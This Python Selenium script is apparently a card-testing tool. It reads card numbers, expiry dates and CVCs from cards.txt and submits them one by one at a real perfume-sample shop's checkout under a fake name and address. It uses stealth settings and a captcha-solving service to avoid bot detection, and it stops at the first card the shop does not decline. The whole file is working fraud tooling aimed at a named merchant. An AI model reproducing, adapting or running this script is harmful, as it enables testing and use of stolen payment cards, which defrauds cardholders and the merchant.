import os
import time

import selenium.webdriver.support.expected_conditions as EC
from dotenv import load_dotenv
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.wait import WebDriverWait
from selenium_stealth import stealth
from twocaptcha import TwoCaptcha
from webdriver_manager.chrome import ChromeDriverManager

load_dotenv()

options = webdriver.ChromeOptions()
options.add_experimental_option("detach", True)

driver = webdriver.Chrome(
    options=options,
    service=Service(ChromeDriverManager().install()),
)

stealth(
    driver,
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.105 Safari/537.36",
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

driver.get(
    "https://perfumerysamples.com/checkouts/cn/Z2NwLWV1cm9wZS13ZXN0MTowMUhTUk5QSzZNM1ZKQ1QyVzdHVDlEWDNCTQ"
)

file = open("cards.txt", "r")

solver = TwoCaptcha(os.environ.get("TWOCAPTCHA_API_KEY"))

start = True

for line in file.readlines():
    if start:
        global cc

        cc = line.split("|")

        for i in range(4):
            cc[i - 1] = cc[i - 1].replace("\n", "")  # Remove line breaks

        number = cc[0]
        expiry = cc[1] + cc[2][len(cc[2]) - 2 :]  # Convert MM, YYYY to MMYY
        cvc = cc[3]

        driver.find_element(By.XPATH, "//input[@id='email']").send_keys(
            "accnotreal1337@proton.me"
        )
        driver.find_element(By.XPATH, "//input[@id='TextField0']").send_keys(
            "Morgan"
        )
        driver.find_element(By.XPATH, "//input[@id='TextField1']").send_keys(
            "LaHaye"
        )
        driver.find_element(By.XPATH, "//input[@id='TextField2']").send_keys(
            "14 Main St"
        )
        driver.find_element(By.XPATH, "//input[@id='TextField3']").send_keys(
            "Ballymahon"
        )
        driver.find_element(By.XPATH, "//select[@id='Select1']").send_keys(
            "Longford"
        )
        driver.find_element(By.XPATH, "//input[@id='TextField4']").send_keys(
            "N39 C3X4"
        )
        driver.find_element(By.XPATH, "//input[@id='TextField4']").send_keys(
            Keys.TAB
        )
        WebDriverWait(driver, 20).until(
            EC.frame_to_be_available_and_switch_to_it(
                (
                    By.XPATH,
                    "//*[starts-with(@id, 'card-fields-number-')]",
                )
            )
        )

        driver.find_element(By.XPATH, "//input[@id='number']").send_keys(
            number
        )
        driver.switch_to.default_content()
        WebDriverWait(driver, 20).until(
            EC.frame_to_be_available_and_switch_to_it(
                (
                    By.XPATH,
                    "//*[starts-with(@id, 'card-fields-expiry-')]",
                )
            )
        )
        driver.find_element(By.XPATH, "//input[@id='expiry']").send_keys(
            expiry[len(expiry) - 4 :]
        )
        driver.find_element(By.XPATH, "//input[@id='expiry']").send_keys(
            expiry[len(expiry) - 2 :]
        )
        driver.switch_to.default_content()
        WebDriverWait(driver, 20).until(
            EC.frame_to_be_available_and_switch_to_it(
                (
                    By.XPATH,
                    "//*[starts-with(@id, 'card-fields-verification_value-')]",
                )
            )
        )
        driver.find_element(
            By.XPATH, "//input[@id='verification_value']"
        ).send_keys(cvc)
        driver.switch_to.default_content()

        driver.find_element(
            By.XPATH,
            "//*[@id='pay-button-container']/div/div/button",
        ).click()
        time.sleep(10)
        driver.find_element(
            By.XPATH,
            "//*[@id='pay-button-container']/div/div/button",
        ).click()

        time.sleep(15)
        err = driver.find_element(By.XPATH, "//div[@class='sdr03sa']")
        decline_text = "Your card was declined. Try again or use a different payment method."

        if decline_text in err.text:
            continue

        start = False
